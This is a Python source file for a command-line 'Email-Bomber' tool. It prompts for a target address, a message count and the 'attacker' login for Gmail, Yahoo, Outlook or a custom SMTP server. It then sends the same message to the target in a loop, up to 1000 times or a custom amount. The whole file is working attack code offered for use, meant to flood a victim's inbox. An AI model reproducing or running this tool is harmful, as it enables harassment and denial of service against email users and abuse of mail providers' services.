import smtplib
import sys


class bColors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'


def banner():
    print(bColors.YELLOW + '<<< Email-Bomber >>>')
    # print(bColors.YELLOW + '<<< made with pyCharm >>>')
    print(bColors.YELLOW + r'''
  _
 | |
 | |___
 |  _  \   _   _
 | |_)  | | (_) |
  \____/   \__, |
            __/ |
           |___/
                                        _                                                         _
                                       | |                                                       (_)
                  ____     ____     ___| |   ___ _   ______   ______    ___ _   ______   ______   _   _ ____
                 / ___\   /    \   /  _  |  / _ | | / _____| / _____|  / _ | | / _____| / _____| | | | |   | \
                | |____  |  ()  | |  (_| | | (_|| | \______\ \______\ | (_|| | \______\ \______\ | | | |   | |
                 \____/   \____/   \____/   \___|_| |______/ |______/  \___|_| |______/ |______/ |_| |_|   |_|
     ''')


class EmailBomber:
    count = 0

    def __init__(self):
        self.amount = None
        try:
            print(bColors.BLUE + '\n[+] Initializing bomber ...')
            self.target = str(input(bColors.GREEN + '[:] Enter Target Email > '))
            self.mode = int(input(bColors.GREEN + '[:] Enter BOMB mode (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:('
                                                  'custom) > '))

            if int(self.mode) > int(4) or int(self.mode) < int(1):
                print(bColors.RED + '[-] ERROR: Invalid Option!')
                sys.exit(0)

        except Exception as e:
            print(bColors.RED + f'[-] ERROR: {e}')
            sys.exit(0)

    def bomb(self):
        try:
            print(bColors.BLUE + '\n[+] Setting up bomb ...')

            if self.mode == int(1):
                self.amount = int(1000)
            elif self.mode == int(2):
                self.amount = int(500)
            elif self.mode == int(3):
                self.amount = int(250)
            else:
                self.amount = int(input(bColors.GREEN + '[:] Choose a CUSTOM amount > '))
            print(bColors.GREEN + f'[+] You have selected BOMB mode {self.mode} and {self.amount} emails')

        except Exception as e:
            print(bColors.RED + f'[-] ERROR: {e}')
            sys.exit(0)

    def email(self):
        try:
            print(bColors.BLUE + '\n[+] Setting up email ...')
            self.server = str(input(bColors.GREEN + '[:] Enter email server | or select premade options - 1:Gmail '
                                                    '2:Yahoo 3:Outlook 4:Custom > '))
            defaultPort = True

            if self.server == '4':
                defaultPort = False
                self.port = int(input(bColors.GREEN + '[:] Enter port number > '))

            if defaultPort:
                self.port = int(587)

            if self.server == '1':
                self.server = 'smtp.gmail.com'
            elif self.server == '2':
                self.server = 'smtp.mail.yahoo.com'
            elif self.server == '3':
                self.server = 'smtp-mail.outlook.com'

            self.fromAddr = str(input(bColors.GREEN + '[:] Enter attacker email address > '))
            self.fromPwd = str(input(bColors.GREEN + '[:] Enter attacker password > '))
            self.subject = str(input(bColors.GREEN + '[:] Enter subject > '))
            self.message = str(input(bColors.GREEN + '[:] Enter message > '))

            if self.target == self.fromAddr:
                print(bColors.RED + '\n[-] ERROR: Can\'t have same Attacker and Target address.')

            self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
                        ''' % (self.fromAddr, self.target, self.subject, self.message)

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddr, self.fromPwd)

        except Exception as e:
            print(bColors.RED + f'[-] ERROR: {e}')
            sys.exit(0)

    def send(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.message)
            self.count += 1
            # print(bColors.YELLOW + f'[+] BOMB: {self.count}')
            sys.stdout.write(bColors.YELLOW + '\r' + f'[+] BOMBED {self.count} emails ' + ('.' * self.count))
            # time.sleep(0.5)

        except Exception as e:
            print(bColors.RED + f'[-] ERROR: {e}')
            sys.exit(0)

    def attack(self):
        print(bColors.BLUE + '\n[+] Attacking ...')
        for email in range(self.amount):
            self.send()
        self.s.close()
        print(bColors.YELLOW + '\n[+] Attack Finished !!')
        sys.exit(0)


if __name__ == '__main__':
    banner()
    bomb = EmailBomber()
    bomb.bomb()
    bomb.email()
    bomb.attack()
